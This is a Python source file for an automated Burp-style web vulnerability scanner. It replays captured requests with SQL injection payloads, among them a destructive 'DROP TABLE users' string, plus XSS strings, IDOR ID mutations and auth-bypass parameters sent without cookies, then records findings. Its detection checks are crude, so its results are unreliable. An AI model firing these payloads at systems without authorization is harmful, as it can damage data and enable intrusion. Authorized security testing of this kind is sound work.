#!/usr/bin/env python3
"""
Automated Burp-Style Vulnerability Testing Engine
Uses captured HTTP requests/responses to automatically test for vulnerabilities
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Tuple
import logging
from asset_manager import VulnerabilityFinding

logger = logging.getLogger(__name__)

class AutomatedBurpTester:
    def __init__(self, asset_manager, config: Dict):
        self.asset_manager = asset_manager
        self.config = config
        self.session_timeout = aiohttp.ClientTimeout(total=30)
        
        # Advanced payloads for different vulnerability types
        self.sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'a'='a",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            ""><script>alert('XSS')</script>",
            "<script>fetch('/admin')</script>"
        ]
        
        self.idor_patterns = [
            lambda x: str(int(x) + 1) if x.isdigit() else x,
            lambda x: str(int(x) - 1) if x.isdigit() else x,
            lambda x: str(int(x) * 2) if x.isdigit() else x,
            lambda x: "1" if x.isdigit() else x,
            lambda x: "0" if x.isdigit() else x,
            lambda x: "admin" if x != "admin" else "user",
            lambda x: x.replace("user", "admin") if "user" in x.lower() else x
        ]
        
        self.auth_bypass_payloads = [
            {"bypass": "true"},
            {"admin": "1"},
            {"role": "admin"},
            {"user_id": "1"},
            {"is_admin": "true"},
            {"privilege": "admin"},
            {"access_level": "99"}
        ]

    async def run_automated_testing(self, target_url: str = None):
        """Run comprehensive automated vulnerability testing on captured requests"""
        logger.info("🚀 Starting automated Burp-style vulnerability testing")
        
        # Get captured HTTP requests from database
        captured_requests = await self._get_captured_requests(target_url)
        
        if not captured_requests:
            logger.warning("No captured requests found for testing")
            return []
        
        all_findings = []
        
        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
            for request_data in captured_requests:
                logger.info(f"🔍 Testing {request_data['url']}")
                
                # Parse the captured request
                parsed_request = self._parse_http_request(request_data['request_headers'])
                
                if not parsed_request:
                    continue
                
                # Run different types of automated tests
                findings = []
                
                # 1. Automated IDOR Testing
                findings.extend(await self._test_idor_vulnerabilities(session, parsed_request, request_data))
                
                # 2. Automated SQL Injection Testing
                findings.extend(await self._test_sql_injection(session, parsed_request, request_data))
                
                # 3. Automated XSS Testing
                findings.extend(await self._test_xss_vulnerabilities(session, parsed_request, request_data))
                
                # 4. Automated Authentication Bypass
                findings.extend(await self._test_auth_bypass(session, parsed_request, request_data))
                
                # 5. Automated Parameter Manipulation
                findings.extend(await self._test_parameter_manipulation(session, parsed_request, request_data))
                
                all_findings.extend(findings)
                
                # Rate limiting to avoid overwhelming target
                await asyncio.sleep(0.5)
        
        logger.info(f"✅ Automated testing complete. Found {len(all_findings)} potential vulnerabilities")
        return all_findings

    async def _get_captured_requests(self, target_url: str = None) -> List[Dict]:
        """Get captured HTTP requests from database"""
        with self.asset_manager._get_db() as db:
            if target_url:
                cursor = db.execute("""
                    SELECT url, request_headers, response_headers, response_body, status_code
                    FROM assets 
                    WHERE url LIKE ? AND request_headers IS NOT NULL 
                    AND request_headers LIKE 'GET %'
                    ORDER BY last_scanned DESC
                """, (f"%{urlparse(target_url).netloc}%",))
            else:
                cursor = db.execute("""
                    SELECT url, request_headers, response_headers, response_body, status_code
                    FROM assets 
                    WHERE request_headers IS NOT NULL 
                    AND request_headers LIKE 'GET %'
                    ORDER BY last_scanned DESC
                    LIMIT 50
                """)
            
            return [{"url": row[0], "request_headers": row[1], "response_headers": row[2], 
                    "response_body": row[3], "status_code": row[4]} for row in cursor.fetchall()]

    def _parse_http_request(self, raw_request: str) -> Dict:
        """Parse raw HTTP request into components"""
        try:
            lines = raw_request.split('\r\n')
            if not lines:
                return None
            
            # Parse request line
            request_line = lines[0]
            parts = request_line.split(' ')
            if len(parts) < 3:
                return None
            
            method, path, version = parts[0], parts[1], parts[2]
            
            # Parse headers
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()
            
            # Parse URL components
            parsed_url = urlparse(f"http://{headers.get('Host', 'localhost')}{path}")
            query_params = parse_qs(parsed_url.query)
            
            return {
                'method': method,
                'url': parsed_url.geturl(),
                'path': parsed_url.path,
                'query_params': query_params,
                'headers': headers,
                'host': headers.get('Host', 'localhost')
            }
        except Exception as e:
            logger.error(f"Error parsing HTTP request: {e}")
            return None

    async def _test_idor_vulnerabilities(self, session: aiohttp.ClientSession, 
                                        parsed_request: Dict, original_data: Dict) -> List[Dict]:
        """Test for IDOR vulnerabilities by manipulating ID parameters"""
        findings = []
        
        # Look for potential ID parameters in URL and query params
        id_patterns = re.compile(r'\b(id|user_id|account_id|order_id|document_id|file_id)\b', re.IGNORECASE)
        
        for param_name, param_values in parsed_request['query_params'].items():
            if id_patterns.search(param_name) or any(val.isdigit() for val in param_values):
                
                for pattern_func in self.idor_patterns:
                    for original_value in param_values:
                        try:
                            # Apply IDOR pattern
                            modified_value = pattern_func(original_value)
                            
                            if modified_value == original_value:
                                continue
                            
                            # Build modified URL
                            modified_params = parsed_request['query_params'].copy()
                            modified_params[param_name] = [modified_value]
                            
                            modified_query = urlencode(modified_params, doseq=True)
                            modified_url = urlunparse((
                                'http', parsed_request['host'], parsed_request['path'],
                                '', modified_query, ''
                            ))
                            
                            # Test the modified request
                            async with session.get(modified_url, headers=self._get_test_headers(parsed_request)) as response:
                                response_text = await response.text()
                                
                                # Analyze response for IDOR indicators
                                if self._analyze_idor_response(response, response_text, original_data):
                                    finding = {
                                        'type': 'IDOR',
                                        'severity': 'HIGH',
                                        'parameter': param_name,
                                        'original_value': original_value,
                                        'modified_value': modified_value,
                                        'url': modified_url,
                                        'evidence': f"Parameter {param_name} changed from {original_value} to {modified_value}, response indicates data access",
                                        'status_code': response.status,
                                        'response_size': len(response_text)
                                    }
                                    findings.append(finding)
                                    logger.info(f"🎯 IDOR found: {param_name}={modified_value}")
                        
                        except Exception as e:
                            logger.debug(f"IDOR test failed for {param_name}: {e}")
        
        return findings

    async def _test_sql_injection(self, session: aiohttp.ClientSession,
                                 parsed_request: Dict, original_data: Dict) -> List[Dict]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        
        for param_name, param_values in parsed_request['query_params'].items():
            for payload in self.sql_payloads:
                try:
                    # Build SQL injection test URL
                    modified_params = parsed_request['query_params'].copy()
                    modified_params[param_name] = [payload]
                    
                    modified_query = urlencode(modified_params, doseq=True)
                    test_url = urlunparse((
                        'http', parsed_request['host'], parsed_request['path'],
                        '', modified_query, ''
                    ))
                    
                    async with session.get(test_url, headers=self._get_test_headers(parsed_request)) as response:
                        response_text = await response.text()
                        
                        # Check for SQL injection indicators
                        if self._analyze_sqli_response(response_text, payload):
                            finding = {
                                'type': 'SQL_INJECTION',
                                'severity': 'CRITICAL',
                                'parameter': param_name,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f"SQL injection detected in parameter {param_name}",
                                'status_code': response.status,
                                'indicators': self._get_sqli_indicators(response_text)
                            }
                            findings.append(finding)
                            logger.info(f"💉 SQL Injection found: {param_name} with payload: {payload}")
                
                except Exception as e:
                    logger.debug(f"SQL injection test failed for {param_name}: {e}")
        
        return findings

    async def _test_xss_vulnerabilities(self, session: aiohttp.ClientSession,
                                       parsed_request: Dict, original_data: Dict) -> List[Dict]:
        """Test for XSS vulnerabilities"""
        findings = []
        
        for param_name, param_values in parsed_request['query_params'].items():
            for payload in self.xss_payloads:
                try:
                    # Build XSS test URL
                    modified_params = parsed_request['query_params'].copy()
                    modified_params[param_name] = [payload]
                    
                    modified_query = urlencode(modified_params, doseq=True)
                    test_url = urlunparse((
                        'http', parsed_request['host'], parsed_request['path'],
                        '', modified_query, ''
                    ))
                    
                    async with session.get(test_url, headers=self._get_test_headers(parsed_request)) as response:
                        response_text = await response.text()
                        
                        # Check for XSS reflection
                        if payload in response_text and response.status == 200:
                            finding = {
                                'type': 'XSS',
                                'severity': 'HIGH',
                                'parameter': param_name,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f"XSS payload reflected in response for parameter {param_name}",
                                'status_code': response.status,
                                'reflected': True
                            }
                            findings.append(finding)
                            logger.info(f"🚨 XSS found: {param_name} reflects payload: {payload}")
                
                except Exception as e:
                    logger.debug(f"XSS test failed for {param_name}: {e}")
        
        return findings

    async def _test_auth_bypass(self, session: aiohttp.ClientSession,
                               parsed_request: Dict, original_data: Dict) -> List[Dict]:
        """Test for authentication bypass vulnerabilities"""
        findings = []
        
        # Test with modified headers and parameters
        for bypass_params in self.auth_bypass_payloads:
            try:
                # Add bypass parameters to query
                modified_params = parsed_request['query_params'].copy()
                modified_params.update({k: [v] for k, v in bypass_params.items()})
                
                modified_query = urlencode(modified_params, doseq=True)
                test_url = urlunparse((
                    'http', parsed_request['host'], parsed_request['path'],
                    '', modified_query, ''
                ))
                
                # Test without authentication headers
                bypass_headers = {k: v for k, v in parsed_request['headers'].items() 
                                if 'cookie' not in k.lower() and 'authorization' not in k.lower()}
                
                async with session.get(test_url, headers=bypass_headers) as response:
                    response_text = await response.text()
                    
                    # Check if bypass was successful
                    if self._analyze_auth_bypass(response, response_text, original_data):
                        finding = {
                            'type': 'AUTH_BYPASS',
                            'severity': 'CRITICAL',
                            'bypass_method': str(bypass_params),
                            'url': test_url,
                            'evidence': f"Authentication bypass successful with parameters: {bypass_params}",
                            'status_code': response.status,
                            'original_status': original_data['status_code']
                        }
                        findings.append(finding)
                        logger.info(f"🔓 Auth bypass found with: {bypass_params}")
            
            except Exception as e:
                logger.debug(f"Auth bypass test failed: {e}")
        
        return findings

    async def _test_parameter_manipulation(self, session: aiohttp.ClientSession,
                                          parsed_request: Dict, original_data: Dict) -> List[Dict]:
        """Test for parameter manipulation vulnerabilities"""
        findings = []
        
        # Test parameter pollution, type confusion, etc.
        manipulation_tests = [
            {'action': 'array_injection', 'modifier': lambda k, v: (f"{k}[]", v)},
            {'action': 'null_byte', 'modifier': lambda k, v: (k, f"{v}%00")},
            {'action': 'type_confusion', 'modifier': lambda k, v: (k, '["' + v + '"]') if v else (k, v)},
            {'action': 'parameter_pollution', 'modifier': lambda k, v: (k, [v, 'admin'])}
        ]
        
        for test in manipulation_tests:
            for param_name, param_values in parsed_request['query_params'].items():
                try:
                    for original_value in param_values:
                        # Apply manipulation
                        modified_key, modified_value = test['modifier'](param_name, original_value)
                        
                        modified_params = parsed_request['query_params'].copy()
                        del modified_params[param_name]
                        
                        if isinstance(modified_value, list):
                            modified_params[modified_key] = modified_value
                        else:
                            modified_params[modified_key] = [modified_value]
                        
                        modified_query = urlencode(modified_params, doseq=True)
                        test_url = urlunparse((
                            'http', parsed_request['host'], parsed_request['path'],
                            '', modified_query, ''
                        ))
                        
                        async with session.get(test_url, headers=self._get_test_headers(parsed_request)) as response:
                            response_text = await response.text()
                            
                            # Analyze for unusual behavior
                            if self._analyze_parameter_manipulation(response, response_text, original_data, test['action']):
                                finding = {
                                    'type': 'PARAMETER_MANIPULATION',
                                    'severity': 'MEDIUM',
                                    'manipulation_type': test['action'],
                                    'parameter': param_name,
                                    'modified_parameter': modified_key,
                                    'url': test_url,
                                    'evidence': f"Parameter manipulation {test['action']} showed unusual behavior",
                                    'status_code': response.status
                                }
                                findings.append(finding)
                                logger.info(f"🔧 Parameter manipulation found: {test['action']} on {param_name}")
                
                except Exception as e:
                    logger.debug(f"Parameter manipulation test failed: {e}")
        
        return findings

    def _get_test_headers(self, parsed_request: Dict) -> Dict:
        """Get headers for testing requests"""
        headers = parsed_request['headers'].copy()
        headers['User-Agent'] = 'ModScan-AutoBurp/1.0'
        return headers

    def _analyze_idor_response(self, response, response_text: str, original_data: Dict) -> bool:
        """Analyze response for IDOR indicators"""
        # Look for signs of successful data access
        idor_indicators = [
            'user', 'account', 'profile', 'dashboard', 'admin',
            'email', 'phone', 'address', 'balance', 'order'
        ]
        
        # Check if response has similar structure but different data
        if response.status == 200 and len(response_text) > 100:
            indicator_count = sum(1 for indicator in idor_indicators if indicator in response_text.lower())
            return indicator_count >= 2
        
        return False

    def _analyze_sqli_response(self, response_text: str, payload: str) -> bool:
        """Analyze response for SQL injection indicators"""
        sql_errors = [
            'mysql_fetch', 'mysql_num_rows', 'mysql_error', 'sql syntax',
            'sqlstate', 'sqlite_', 'ora-', 'postgresql', 'syntax error',
            'unclosed quotation mark', 'quoted string not properly terminated'
        ]
        
        return any(error in response_text.lower() for error in sql_errors)

    def _get_sqli_indicators(self, response_text: str) -> List[str]:
        """Get specific SQL injection indicators from response"""
        sql_errors = [
            'mysql_fetch', 'mysql_num_rows', 'mysql_error', 'sql syntax',
            'sqlstate', 'sqlite_', 'ora-', 'postgresql', 'syntax error'
        ]
        
        return [error for error in sql_errors if error in response_text.lower()]

    def _analyze_auth_bypass(self, response, response_text: str, original_data: Dict) -> bool:
        """Analyze response for authentication bypass"""
        # Check if we got access without proper authentication
        if response.status == 200 and original_data['status_code'] in [401, 403]:
            return True
        
        # Check for admin/privileged content
        bypass_indicators = ['admin', 'dashboard', 'control panel', 'settings', 'users']
        return any(indicator in response_text.lower() for indicator in bypass_indicators)

    def _analyze_parameter_manipulation(self, response, response_text: str, 
                                       original_data: Dict, action: str) -> bool:
        """Analyze response for parameter manipulation effects"""
        # Look for different response patterns
        if action == 'array_injection':
            return 'array' in response_text.lower() or '[' in response_text
        elif action == 'null_byte':
            return response.status != original_data['status_code']
        elif action == 'type_confusion':
            return len(response_text) != len(original_data.get('response_body', ''))
        elif action == 'parameter_pollution':
            return 'admin' in response_text.lower()
        
        return False

    async def save_findings_to_db(self, findings: List[Dict]):
        """Save vulnerability findings using AssetManager canonical API (dedup-aware)"""
        for f in findings:
            try:
                # Resolve or create asset_id for the URL
                url = f.get('url') or ''
                if not url:
                    continue
                with self.asset_manager._get_db() as db:
                    row = db.execute("SELECT id FROM assets WHERE url = ? LIMIT 1", (url,)).fetchone()
                    asset_id = row[0] if row else None
                if not asset_id:
                    try:
                        from urllib.parse import urlparse
                        host = (urlparse(url).netloc or '')
                    except Exception:
                        host = ''
                    asset_id = self.asset_manager.add_asset(url, host, 'automated_burp')
                    if not asset_id:
                        continue

                vf = VulnerabilityFinding(
                    url=url,
                    vuln_type=str(f.get('type') or 'UNKNOWN').upper(),
                    severity=str(f.get('severity') or 'LOW').capitalize(),
                    confidence=float(f.get('confidence', 0.6)),
                    payload=str(f.get('payload') or ''),
                    evidence=str(f.get('evidence') or json.dumps(f, ensure_ascii=False)),
                    discovered_at=datetime.now(),
                    affected_parameter=str(f.get('param') or ''),
                )
                self.asset_manager.add_vulnerability_finding(vf, asset_id)
            except Exception:
                # Do not crash bulk save on a single malformed record
                continue

if __name__ == "__main__":
    # Example usage
    from asset_manager import AssetManager
    
    async def main():
        asset_manager = AssetManager()
        config = {}
        
        tester = AutomatedBurpTester(asset_manager, config)
        # Replace with your target, e.g., http://example.com
        findings = await tester.run_automated_testing("http://example.com")
        
        if findings:
            await tester.save_findings_to_db(findings)
            print(f"Found {len(findings)} vulnerabilities!")
        else:
            print("No vulnerabilities found.")
    
    asyncio.run(main())
